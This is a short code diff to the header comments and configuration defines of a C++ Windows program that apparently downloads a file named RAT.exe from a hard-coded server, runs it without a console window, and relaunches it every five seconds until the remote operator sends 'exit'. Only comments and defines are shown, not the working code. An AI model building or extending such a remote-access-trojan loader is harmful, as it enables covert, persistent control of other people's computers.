@@ -3,14 +3,15 @@
 //
 //
 // The program attempts to connect to a server and port
-// specified on the command line. The Server program prints
-// the needed information when it is started. Once connected,
+// specified on the command line or hard coded. Once connected,
 // the program sends a file name to the server, waits for a response
-// and receives the file, the RAT.exe.
+// and receives the file, the RAT.exe. The program will then attempt
+// to launch the .exe AND WILL CONTINU TO DO SO every 5 seconds, until 
+// the .exe is terminated by the remote server user with the command "exit"
 //
 // Compile and link with wsock32.lib.
 // Using multi-byte encoding.
-// Targeting the Windows:Subsytem, with mainCRTStartup entry point
+// Targeting the /SUBSYSTEM:windows, with mainCRTStartup entry point
 //
 // Pass the server name, port number, and file name on the command line. 
 //
@@ -31,7 +32,7 @@ using namespace std;
 
 //Define for port and host arguments
 #define HARD_CODED_ARGS
-#define SERVER_NAME "P2-4130-31" //Can be Name or IP address
+#define SERVER_NAME "127.0.0.1" //Can be Name or IP address
 #define MY_PORT 2020
 #define RAT_PORT 2030
 #define FILE_NAME "RAT.exe"
